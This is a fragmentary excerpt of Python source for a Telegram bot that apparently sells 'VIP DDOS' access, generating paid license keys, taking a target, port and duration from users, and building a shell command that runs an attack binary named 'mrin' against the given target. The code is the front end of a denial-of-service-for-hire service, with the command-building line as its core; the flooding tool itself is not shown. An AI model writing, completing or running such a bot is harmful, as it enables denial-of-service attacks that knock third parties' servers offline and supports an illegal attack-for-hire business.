...
def create_random_key(length=10):
    ...
    custom_key = f"MALAYALI-VIP-{random_key.upper()}"
    return custom_key
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𑁍┊⪼ꮇá𝗅áɏáļḭ⪻┊™ 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if time > 300:
                ...
                full_command = f"./mrin {target} {port} {time} 2500"
